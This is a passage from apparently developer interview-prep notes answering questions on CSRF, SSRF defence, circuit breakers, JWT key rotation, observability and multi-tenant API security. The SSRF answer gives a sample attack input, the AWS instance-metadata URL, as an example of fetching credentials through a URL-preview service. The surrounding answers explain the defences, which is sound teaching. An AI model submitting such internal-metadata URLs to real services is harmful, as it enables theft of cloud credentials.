> CSRF tricks a user's browser into making an authenticated request to a site the user is logged into, from a different (malicious) site. It works because browsers automatically include cookies with cross-site requests. `SameSite=Strict` tells the browser never to send the cookie in cross-site requests — so even if evil.com submits a form to bank.com, the session cookie is not included. The bank sees no authenticated session and rejects the request.

**Q36. What is SSRF and how would you defend against it in a URL-fetching service?**
> SSRF (Server-Side Request Forgery) is when an attacker makes the server fetch an internal URL — bypassing firewalls. For example, submitting `http://169.254.169.254/latest/meta-data/` to a URL-preview service fetches AWS instance metadata including credentials. Defense: validate that the URL's resolved IP is not in private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16) before fetching. Use an allowlist of permitted domains if possible. Run fetching in an isolated network with no internal access.

---

### Scenario-Based

**Q37. An order service calls a payment service synchronously. The payment service is slow. How do you fix this?**
> I'd start by adding a circuit breaker (Resilience4j) to fail fast after a threshold of failures or timeouts, returning a graceful fallback. If the payment result isn't needed immediately, I'd decouple them with async messaging — the order service publishes an "order placed" event; the payment service consumes and processes it asynchronously. The order is created in PENDING state and transitions to CONFIRMED once payment processes. This removes the blocking dependency and makes both services independently scalable.

**Q38. How would you implement zero-downtime deployment for a microservice with a JWT-based auth system?**
> JWT validation uses a secret key. Zero-downtime key rotation: introduce the new secret while keeping the old one, validate tokens signed with either secret (dual validation), gradually roll out new tokens, then drop validation of the old secret after all old tokens expire. For deployments: use blue-green or rolling deployment. Ensure the new service version is backward-compatible (handles both old and new request formats). Run both versions simultaneously during rollout. Only retire the old version once the new one is healthy.

**Q39. A service has high error rates. Walk through how you'd diagnose it using observability tools.**
> Step 1: Check the Grafana dashboard — error rate spike at what time? Which endpoint? Is latency also high? Step 2: Open distributed traces (Jaeger) for the failing requests — where in the call chain is the error occurring? Which span is failing? Step 3: Go to the logs for that service — filter by the trace ID from step 2 to see the exact error message, stack trace, and context (user ID, input values). Step 4: Check metrics — is there a correlated infrastructure issue (CPU spike, memory pressure, DB connection pool exhausted)? This moves you from "something is wrong" to "exactly what and why" in minutes.

**Q40. How would you secure a multi-tenant API where tenants must never access each other's data?**
> Four layers of defense: (1) JWT contains `tenant_id` claim, signed by the auth server — clients cannot forge it. (2) Every API endpoint validates the JWT and extracts tenant context into a thread-local. (3) All DB queries are filtered with `WHERE tenant_id = ?` — enforced at the repository layer, never left to individual developers to remember. (4) Integration tests verify cross-tenant access returns 403. I'd also consider row-level security in PostgreSQL — the DB itself enforces the tenant filter, so even a missed `WHERE` clause returns only the current tenant's data.

---

*End of Phase 3 Notes — Keep building, keep learning! 🚀*